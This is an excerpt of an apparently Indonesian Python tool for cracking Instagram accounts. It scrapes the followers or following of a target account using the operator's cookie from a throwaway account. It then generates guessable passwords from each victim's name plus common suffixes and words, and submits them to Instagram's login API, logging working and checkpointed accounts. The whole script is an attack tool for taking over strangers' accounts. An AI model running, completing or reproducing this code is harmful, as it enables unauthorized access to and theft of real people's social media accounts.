...
def CetakBanner(riski,asu):
    Console(width=50).print(Panel(riski,style=asu),justify='center')

def riski(kaya,kontol):
    Console(width=50).print(Panel(kaya,style=kontol))

def banner():
    CetakBanner('''[bold green]╔╗ ╦═╗╦ ╦╔╦╗╔═╗  ╦╔═╗
╠╩╗╠╦╝║ ║ ║ ║╣   ║║ ╦
╚═╝╩╚═╚═╝ ╩ ╚═╝  ╩╚═╝
( AUTHOR:RISKI-X🧐 [bold white] VERSION:0.1[bold green]) ''','color(8)')

def masuk():
    os.system('clear');banner()
    riski('[bold white]masukan cookies akun instagram kamu, pastikan memakai akun tumbal','color(8)')
...
def menu():
    ...
    os.system('clear')
    banner()
    riski(f'''[bold white][[bold green]•[bold white]] Welcome   : [bold green]{nama}
...
[bold white][[bold green]•[bold white]] Following : [bold green]{wing}''','color(8)')
    riski('''[bold white][[bold green]1[bold white]] Crack dari followers
...
[bold white][[bold green]0[bold white]] Keluar...''','color(8)')
    ...
    if cuih in ['1','01']:
        riski('[bold white]masukan username target, kamu juga bisa gunakan tanda koma untuk pemisahan contoh name1,name2','color(8)')
        nama = input(f'  {B}• {B}masukan nama target: {B}')
        user = convert(nama,coki)
        dump().followers(user,coki,'')

    elif cuih in ['2','02']:
        riski('[bold white]masukan username target, kamu juga bisa gunakan tanda koma untuk pemisahan contoh Riski-x,cantik','color(8)')
        nama = input(f'  {B}• {B}masukan nama target : {B}')
        user = convert(nama,coki)
        dump().following(user,coki,khamdihidev=' ')
    elif cuih in ['3','03']:
        afah,iyah=[],0
        riski('[bold white][[bold green]1[bold white]] chek hasil akun [bold green]OK\n[bold white][[bold green]2[bold white]] chek hasil akun [bold yellow]CP','color(8)')
        akun = input(f'  {B}• {B}pilih menu : {B}')
        if akun in ['1','01']:
...
class dump:
    ...
    def selanjutnya(self, kontol):
        ...
        riski('''[bold white][[bold green]1[bold white]] sandi : nama,nama123,nama125
...
[bold white][[bold green]3[bold white]] sandi : nama,nama123,nama1234,nama12345 ++''','color(8)')
        ...
        if sandi in ['3','03']:
           riski('[bold white]gunakan tanda koma untum pemisahan contoh asep123,sutri123','color(8)')
           pwek = input(f'  {H}• {N}masukan kata sandi : ')
           if len(pwek) <=5:
                exit(f'\n  {M} Sandi harus lebih dari 5 huruf')
                 ...
                 try:
                       ...
                       for x in password.split(' '):
                           if len(x) <3:
                               ...
                               if sandi in ['1','01']:
                                    pwx = [x,x+'123',x+'125',x+'1234','bismillah','sayang',x.lower()+'123',x.lower()+'125',x.lower()+'1234']
                               elif sandi in ['2','02']:
    ...
    def crack(self, user, pwx):
        ...
        for pw in pwx:
             try:
                   ...
                   riski = i.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', data=data)
